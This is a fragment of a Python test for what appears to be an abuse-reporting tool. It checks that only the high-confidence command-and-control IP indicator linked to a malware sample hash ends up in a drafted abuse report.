    async with engine.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO sample_links (sha256, kind, value, source, confidence) VALUES "
                "(:s, 'c2_ip', '198.51.100.44', 'static', 'high'), "
                "(:s, 'c2_ip', '198.51.100.45', 'static', 'medium')"
            ),
            {"s": SHA},
        )
    stats = await DraftBuilder(
        factory, DEMO, TermsCache(factory, {}), resolver(factory, Wire(), DEMO)
    ).run(NOW, allow_lookups=False)
    assert stats.selected == 1
    ev = await scalar(engine, "SELECT evidence FROM abuse_reports WHERE kind = 'c2'")
    assert [s["value"] for s in ev["subjects"]] == ["198.51.100.44"]
    assert ev["subjects"][0]["samples"][0]["sha256"] == SHA
